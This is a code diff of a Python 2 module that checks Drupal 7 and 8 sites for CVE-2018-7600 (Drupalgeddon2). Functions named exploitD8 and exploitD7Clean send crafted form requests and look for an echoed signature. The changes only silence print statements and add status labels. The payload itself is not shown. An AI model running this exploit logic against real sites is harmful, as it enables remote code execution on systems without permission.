@@ -3,25 +3,24 @@ import requests
 import re
 
 
-
 def processRedirectedURL(url, version):
-    print 'Redirected ' + url
+    # print 'Redirected ' + url
     headers = ulti.genHeader()
     form_id = '/user/password' if version[:1] == '7' else '/user/register'
     if ('profile=default' in url):
         return True
 
     if('?q=' in url and version is '8'):
-        print "Case q8"
+        # print "Case q8"
         return False
 
     if('?q=user/password' in url and version is '7'):
-        print "Case q7"
+        # print "Case q7"
         url = url[:-16]
         return isPwnAbleWithQ(url)
 
     if(form_id in url):
-        print "Case form in url"
+        # print "Case form in url"
         url = url[:-14]
         if(version is '8'):
             return exploitD8(url)
@@ -32,7 +31,7 @@ def processRedirectedURL(url, version):
 
     res = requests.get(url, headers=headers, timeout=5)
     if ('user_pass' not in res.text and 'user_form' not in res.text):
-        print "Case brand new"
+        # print "Case brand new"
         # return isVuln(url,version)
         return False
 
@@ -86,7 +85,7 @@ def isPwnAbleWithQ(host):
         r = requests.post(host, data=post_params,
                           params=get_params, verify=False, timeout=20)
     except Exception as e:
-        print e
+        # print e
         return False
     m = re.search(r'<input type="hidden" name="form_build_id"'
                   ' value="([^"]+)"', r.text)
@@ -122,7 +121,7 @@ def exploitD7Clean(host):
         r = requests.post(url, data=post_params,
                           params=get_params, verify=False)
     except Exception as e:
-        print e
+        # print e
         return False
     m = re.search(r'<input type="hidden" name="form_build_id"'
                   ' value="([^"]+)"', r.text)
@@ -157,7 +156,7 @@ def exploitD8(host):
     try:
         res = requests.post(url, data=post_params, verify=False, timeout=50)
     except Exception as e:
-        print e
+        # print e
         return False
     detect = bool(re.search(signature, res.text))
     n = bool(re.search('echo ' + signature, res.text))
@@ -193,18 +192,18 @@ def isVuln(host, version):
     version = version[:1]
     formStatus = isFormValid(host, version)
     if(formStatus is False):
-        return False
+        return False, ""
     elif('enable' in formStatus):
-        return isPwnAbleClean(host, version)
+        return isPwnAbleClean(host, version), "cleanURL_enable"
 
     elif('disable' in formStatus):
-        return isPwnAbleWithQ(host)
+        return isPwnAbleWithQ(host), "cleanURL_disable"
 
     elif('Redirected' in formStatus):
-        return processRedirectedURL(formStatus[10:], version)
+        return processRedirectedURL(formStatus[10:], version), "Redirected"
 
     else:
-        return False
+        return False, ""
 
 # Fuction: call for module mode
 # - RETURN:
@@ -214,8 +213,8 @@ def isVuln(host, version):
 
 def check_CVE_7600(host, version):
     try:
-        res = isVuln(host, version)
+        res, stt = isVuln(host, version)
     except Exception as e:
-        print e
-        return False
-    return res
+        # print e
+        return False, ""
+    return res, stt
